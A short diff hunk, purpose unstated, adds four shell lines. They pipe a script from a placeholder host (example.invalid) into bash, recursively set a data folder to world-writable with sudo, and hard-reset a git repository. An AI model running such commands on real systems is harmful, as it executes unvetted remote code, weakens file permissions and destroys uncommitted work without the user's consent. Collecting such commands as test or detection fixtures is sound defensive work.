@@ -1,0 +1,4 @@
+cd <project>
+curl -fsSL https://example.invalid/install.sh | bash
+sudo chmod -R 777 ./data
+git reset --hard HEAD
